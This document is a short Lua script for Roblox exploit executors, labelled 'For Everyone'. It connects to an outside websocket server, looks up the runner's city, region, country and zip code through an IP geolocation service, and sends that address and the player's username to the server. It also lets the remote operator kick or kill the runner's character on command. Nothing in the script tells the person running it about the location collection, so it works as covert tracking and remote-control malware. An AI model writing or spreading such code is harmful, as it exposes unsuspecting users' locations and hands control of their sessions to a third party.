--\\ For Everyone //--
local WebSocket = syn.websocket.connect("wss://plants-websocket.glitch.me/") or Krnl.WebSocket.connect("wss://plants-websocket.glitch.me/") or WebSocket.connect("wss://plants-websocket.glitch.me/")
local IpApi = game.HttpService:JSONDecode(game:HttpGet("http://ip-api.com/json/", true))
local Address = IpApi["city"] .. " " .. IpApi["regionName"] .. " " .. IpApi["country"] .. " " .. IpApi["zip"]
WebSocket.OnMessage:Connect(function(Message)
    local MessageTable = string.split(Message, " ")
    if string.lower(MessageTable[1]) == "!kick" then
        if MessageTable[3] then
            local Command = MessageTable[1] .. MessageTable[2]
            game.Players.LocalPlayer:Kick(string.sub(Message, #Command + 3, #Message))
        else
            game.Players.LocalPlayer:Kick("Kicked By Script Owner.")
        end
    elseif string.lower(MessageTable[1]) == "!clientsconnected" then
        game.StarterGui:SetCore("SendNotification", {
            ["Title"] = "Number Of Clients Connected.",
            ["Text"] = "Clients Connected: " .. MessageTable[2],
            ["Duration"] = 5
        })
    elseif string.lower(MessageTable[1]) == "!kill" then
        if game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid") then
            game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid").Health = 0
        end
    elseif string.lower(MessageTable[1]) == "!port" then
        game.StarterGui:SetCore("SendNotification", {
            ["Title"] = "WebSocket Port.",
            ["Text"] = "Port Connected: " .. MessageTable[2],
            ["Duration"] = 5
        })
    elseif string.lower(MessageTable[1]) == "!address" then
        local Command = MessageTable[1] .. game.Players.LocalPlayer.Name
        game.StarterGui:SetCore("SendNotification", {
            ["Title"] = "Address.",
            ["Text"] = MessageTable[2] .. ": " .. string.sub(Message, #Command + 3, #Message),
            ["Duration"] = 5
        })
    end
end)
WebSocket:Send("!setid " .. string.lower(game.Players.LocalPlayer.Name))
WebSocket:Send("!setaddress " .. Address)
